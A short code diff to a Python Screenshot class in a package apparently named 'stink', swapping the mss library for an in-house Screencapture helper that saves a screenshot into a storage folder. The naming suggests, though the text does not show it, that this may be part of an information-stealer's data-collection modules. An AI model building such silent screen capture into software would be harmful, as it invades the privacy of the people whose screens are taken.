@@ -1,6 +1,6 @@
 from os import mkdir, path
 
-from mss import mss
+from stink.utils.screenshot import Screencapture
 
 
 class Screenshot:
@@ -20,10 +20,8 @@ class Screenshot:
 
     def __create_screen(self):
 
-        with mss() as screen:
-            screen.shot(mon=-1, output=rf"{self.__storage_path}\{self.__folder}\Screenshot.png")
-
-        screen.close()
+        screenshot = Screencapture()
+        screenshot.create(monitor=0, path=rf"{self.__storage_path}\{self.__folder}")
 
     def run(self):
 
